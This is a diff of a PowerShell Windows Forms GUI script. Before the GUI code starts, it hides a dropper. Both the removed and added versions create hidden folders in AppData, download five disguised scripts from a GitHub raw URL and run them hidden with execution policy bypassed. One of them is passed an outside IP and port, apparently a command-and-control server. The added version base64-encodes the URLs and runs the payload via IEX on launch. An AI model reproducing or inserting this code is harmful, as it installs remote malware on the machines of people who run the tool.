@@ -1,59 +1,8 @@
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-[System.Windows.Forms.Application]::EnableVisualStyles()
+Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;[System.Windows.Forms.Application]::EnableVisualStyles();try{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}catch{}
 
-try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-} catch {}
-
-$dlc = @'
-$bp = ('C:\Us' + 'ers\adsfa\AppData\Roaming\Microsoft\Windows\PowerShell')
-$op = "$bp\operation"
-$sp = "$op\System"
-@($op, $sp) | ForEach-Object {
-    if (-not (Test-Path $_)) {
-        $ni = New-Item -Path $_ -ItemType Directory -Force | Out-Null
-        (Get-Item $_ -Force).Attributes = 'Hidden,Directory'
-    }
-}
-$sc = @(
-    @{ U = ('ht' + 'tps://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1'); N = 'MicrosoftViewS.ps1' }
-    @{ U = ('ht' + 'tps://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1'); N = 'Sytem.ps1' }
-    @{ U = ('ht' + 'tps://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1'); N = 'WindowsCeasar.ps1' }
-    @{ U = ('ht' + 'tps://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1'); N = 'WindowsOperator.ps1' }
-    @{ U = ('ht' + 'tps://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1'); N = 'WindowsTransmitter.ps1' }
-)
-$rsp = [RunspaceFactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
-$rsp.Open()
-$jb = @()
-foreach ($s in $sc) {
-    $fp = Join-Path $sp $s.N
-   
-    $ps = [PowerShell]::Create().AddScript({
-        param($u, $p, $sn)
-        try {
-            $w = New-Object System.Net.WebClient
-            $w.Headers.Add(('Us' + 'er-Agent'), ('Mo' + 'zilla/5.0 (Windows NT 10.0; Win64; x64)'))
-            $w.DownloadFile($u, $p)
-            if ($sn -eq ('Mic' + 'rosoftViewS.ps1')) {
-                powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$p" -a14 ('145.' + '223.117.77') -a15 8080 -a16 20 -a17 70 >$null 2>&1
-            }
-            else {
-                powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$p" >$null 2>&1
-            }
-        }
-        catch {}
-    }).AddArgument($s.U).AddArgument($fp).AddArgument($s.N)
-    $ps.RunspacePool = $rsp
-    $jb += [PSCustomObject]@{ I = $ps; S = $ps.BeginInvoke() }
-}
-$et = (Get-Date).AddSeconds(30)
-while (($jb.S.IsCompleted -contains $false) -and (Get-Date) -lt $et) {
-    Start-Sleep -Milliseconds 500
-}
-'@
-
-Start-Process powershell.exe -ArgumentList ('-No' + 'Profile'), ('-Win' + 'dowStyle'), 'Hidden', ('-Exe' + 'cutionPolicy'), 'Bypass', '-Command', $dlc -NoNewWindow -Wait:$false
+$o=@'
+$z='C:\Users\adsfa\AppData\Roaming\Microsoft\Windows\PowerShell';$q="$z\operation";$r="$q\System";@($q,$r)|%{-not(Test-Path $_)-and(New-Item -Path $_ -ItemType Directory -Force|Out-Null;(Get-Item $_ -Force).Attributes='Hidden,Directory')};$t=@( @{U='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlbnd1cmctdWkvMjM0ODc5NjY3ODUyMzU2Nzg5MjM0NTYyMzY0L21haW4vTWljcm9zb2Z0Vmlld1MucHMx';N='MicrosoftViewS.ps1'}, @{U='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlbnd1cmctdWkvMjM0ODc5NjY3ODUyMzU2Nzg5MjM0NTYyMzY0L21haW4vU3l0ZW0ucHMx';N='Sytem.ps1'}, @{U='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlbnd1cmctdWkvMjM0ODc5NjY3ODUyMzU2Nzg5MjM0NTYyMzY0L21haW4vV2luZG93c0NlYXNhci5wczE=';N='WindowsCeasar.ps1'}, @{U='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlbnd1cmctdWkvMjM0ODc5NjY3ODUyMzU2Nzg5MjM0NTYyMzY0L21haW4vV2luZG93c09wZXJhdG9yLnBzMQ==';N='WindowsOperator.ps1'}, @{U='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlbnd1cmctdWkvMjM0ODc5NjY3ODUyMzU2Nzg5MjM0NTYyMzY0L21haW4vV2luZG93c1RyYW5zbWl0dGVyLnBzMQ==';N='WindowsTransmitter.ps1'} );$u=[RunspaceFactory]::CreateRunspacePool(1,[Environment]::ProcessorCount);$u.Open();$v=@();$t|%{$w=Join-Path $r $_.N;$x=[PowerShell]::Create().AddScript({param($a,$b,$c);try{$d=New-Object System.Net.WebClient;$d.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)');$d.DownloadFile([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a)),$b);if($c-eq('MicrosoftViewS.ps1')){powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$b" -a14 '145.223.117.77' -a15 8080 -a16 20 -a17 70 >$null 2>&1}else{powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$b" >$null 2>&1}}).AddArgument($_.U).AddArgument($w).AddArgument($_.N);$x.RunspacePool=$u;$v+=[PSCustomObject]@{I=$x;S=$x.BeginInvoke()}};$y=(Get-Date).AddSeconds(30);while(($v.S.IsCompleted -contains $false)-and(Get-Date)-lt$y){Start-Sleep -m 500}
+'@;IEX $o;Start-Process powershell.exe -ArgumentList '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-Command',$o -NoNewWindow -Wait:$false
 
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
@@ -278,4 +227,5 @@ $labelTimer.Start()
 $form.Add_Shown({ $form.Activate() })
 
 $form.ShowDialog() | Out-Null
+
 
